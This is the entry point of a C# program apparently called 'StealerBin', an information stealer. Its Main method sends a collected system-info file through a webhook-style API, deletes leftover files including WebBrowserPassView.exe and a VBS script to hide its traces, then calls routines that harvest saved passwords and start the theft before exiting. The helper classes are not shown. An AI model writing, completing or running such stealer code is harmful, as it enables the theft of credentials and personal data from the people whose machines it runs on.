using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace StealerBin
{
    public class Hook
	{
        [STAThread]
		private static void Main()
		{
            if (File.Exists("C:/temp/System_INFO.txt"))
            {
                new API(API.Hook)
                {
                    _name = API.name,
                    _ppUrl = API.pfp
                }.SendSysInfo("**SYSTEM INFO**", "C:/temp/System_INFO.txt");
                File.Delete("C:/temp/System_INFO.txt");
            }
            File.Delete("C:/temp/finalres.vbs");
            File.Delete("C:/temp/WebBrowserPassView.exe");
            API.Passwords();
            Stealer.StartSteal();
            Environment.Exit(0);
		}
    }
}
